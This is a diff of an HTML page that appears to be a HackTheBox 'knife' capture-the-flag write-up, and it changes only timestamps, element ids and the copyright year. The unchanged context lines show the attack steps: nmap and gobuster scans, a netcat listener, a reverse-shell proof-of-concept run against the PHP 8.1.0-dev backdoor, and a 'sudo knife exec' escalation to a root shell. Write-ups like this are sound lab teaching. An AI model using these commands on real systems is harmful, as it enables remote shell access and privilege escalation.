@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-03-26 Sat 17:43 -->
+<!-- 2022-03-28 Mon 13:31 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>HTB | knife</title>
@@ -91,7 +91,7 @@ We'll start by examining what services the machine has running.<br>
 <p>
 Below we see the output from the <code>nmap</code> scan.<br>
 </p>
-<pre class="example" id="orgb46cdc5">
+<pre class="example" id="org38d2c2c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ sudo nmap -sV -sC -p- -oA nmap/all_ports -iL target.txt          19:16
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 19:16 CEST
@@ -132,7 +132,7 @@ All right let us enumerate the webserver<br>
 <p>
 <code>gobuster</code> didn't really give us anything of use other than <code>/index.php</code>.<br>
 </p>
-<pre class="example" id="org1fa4403">
+<pre class="example" id="org0b7fefd">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ gobuster dir -u "http://10.129.180.32" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -d -b 404,403                                                                                                  19:21
 ===============================================================
@@ -166,7 +166,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 If we open up the site with a browser connected to a proxy like <code>zap</code> or <code>burp</code>, and navigate to <code>/index.php</code>.<br>
 </p>
 
-<figure id="org62416be">
+<figure id="org9ed6fcb">
 <img src="assets/2021-07-26_19-51-07_screenshot.png" alt="2021-07-26_19-51-07_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Rendered html of <code>/index.php</code></figcaption>
@@ -175,7 +175,7 @@ If we open up the site with a browser connected to a proxy like <code>zap</code>
 <p>
 The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.<br>
 </p>
-<pre class="example" id="org81b18a3">
+<pre class="example" id="org07d6173">
 HTTP/1.1 200 OK
 Date: Mon, 26 Jul 2021 17:20:52 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -261,7 +261,7 @@ $ nc -nlvp 4444
 <p>
 Then we execute the revshell POC script with the right arguments:<br>
 </p>
-<pre class="example" id="org0c44552">
+<pre class="example" id="orgbb242c0">
 ┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
 └─&gt; $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
 </pre>
@@ -269,7 +269,7 @@ Then we execute the revshell POC script with the right arguments:<br>
 <p>
 And just like that we got a shell and user flag:<br>
 </p>
-<pre class="example" id="org21f194d">
+<pre class="example" id="org26a5d70">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ nc -nlvp 4444                                                    19:56
 james@knife:/$ whoami
@@ -318,7 +318,7 @@ $ sudo knife exec -E 'exec "/bin/sh"'
 <p>
 So let's run it and get our <code>root</code> flag:<br>
 </p>
-<pre class="example" id="orgce7e2f5">
+<pre class="example" id="orgfa2e1f7">
 james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
 sudo knife exec -E 'exec "/bin/bash"'
 
@@ -350,7 +350,7 @@ Read more here: <a href="https://flast101.github.io/php-8.1.0-dev-backdoor-rce/"
 <div id="postamble" class="status">
 <div class="footer">
     <div id="copyright">
-        <small>&copy; Copyright 2021, C3lphie</small>
+        <small>&copy; Copyright 2022, C3lphie</small>
     </div>
 </div>
 </div>
